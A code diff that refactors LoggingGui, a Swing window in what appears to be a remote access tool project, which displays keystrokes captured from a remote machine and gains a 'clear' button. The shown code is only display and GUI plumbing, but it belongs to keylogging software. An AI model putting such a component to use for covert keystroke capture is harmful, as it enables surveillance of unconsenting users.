@@ -1,37 +1,56 @@
-package de.sogomn.rat.gui.server;
+package de.sogomn.rat.gui;
 
+import static de.sogomn.rat.util.Constants.LANGUAGE;
+
+import java.awt.BorderLayout;
+import java.awt.Container;
 import java.awt.Dimension;
+import java.awt.event.ActionEvent;
 
+import javax.swing.JButton;
 import javax.swing.JFrame;
 import javax.swing.JScrollPane;
 import javax.swing.JTextArea;
-import javax.swing.SwingUtilities;
 
 import org.jnativehook.keyboard.NativeKeyEvent;
 
-final class LoggingGui {
+public final class LoggingGui extends AbstractGui {
 	
-	private JFrame frame;
 	private JTextArea textArea;
 	private JScrollPane scrollPane;
+	private JButton clear;
 	
 	private static final Dimension SIZE = new Dimension(500, 500);
 	private static final String KEY_MODIFIER_TEXT_FORMAT = " [%s] ";
 	
+	public static final String CLEAR = LANGUAGE.getString("logger.clear");
+	
 	public LoggingGui() {
-		frame = new JFrame();
 		textArea = new JTextArea();
 		scrollPane = new JScrollPane(textArea, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
+		clear = new JButton(CLEAR);
 		
+		clear.setActionCommand(CLEAR);
+		clear.addActionListener(this::buttonClicked);
 		textArea.setEditable(false);
 		textArea.setLineWrap(true);
 		textArea.setWrapStyleWord(true);
 		
+		final Container contentPane = frame.getContentPane();
+		
+		contentPane.add(scrollPane, BorderLayout.CENTER);
+		contentPane.add(clear, BorderLayout.SOUTH);
+		
 		frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
-		frame.setContentPane(scrollPane);
 		frame.setPreferredSize(SIZE);
 		frame.pack();
 		frame.setLocationRelativeTo(null);
+	}
+	
+	private void buttonClicked(final ActionEvent a) {
+		final String command = a.getActionCommand();
+		
+		notifyListeners(controller -> controller.userInput(command, this));
 	}
 	
 	public void log(final int keyCode) {
@@ -50,21 +69,8 @@ final class LoggingGui {
 		}
 	}
 	
-	public void setVisible(final boolean visible) {
-		SwingUtilities.invokeLater(() -> {
-			frame.setVisible(visible);
-		});
-	}
-	
-	public void close() {
-		SwingUtilities.invokeLater(() -> {
-			frame.setVisible(false);
-			frame.dispose();
-		});
-	}
-	
-	public void setTitle(final String title) {
-		frame.setTitle(title);
+	public void clear() {
+		textArea.setText("");
 	}
 	
 }
